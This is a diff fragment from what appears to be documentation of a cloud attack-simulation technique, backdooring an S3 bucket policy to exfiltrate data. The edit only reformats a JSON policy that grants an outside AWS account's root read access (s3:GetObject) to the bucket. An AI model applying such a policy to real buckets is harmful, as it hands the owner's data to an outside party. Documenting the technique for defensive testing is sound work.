@@ -30,12 +30,12 @@ Exfiltrates data from an S3 bucket by backdooring its Bucket Policy to allow acc
 <pre>
 <code>
 {
-  "Version":"2012-10-17",
-  "Statement":[
+  "Version": "2012-10-17",
+  "Statement": [
     {
       "Effect": "Allow",
       "Principal": {
-        "AWS":"arn:aws:iam::193672423079:root"
+        "AWS": "arn:aws:iam::193672423079:root"
       },
       "Action": [
         "s3:GetObject",
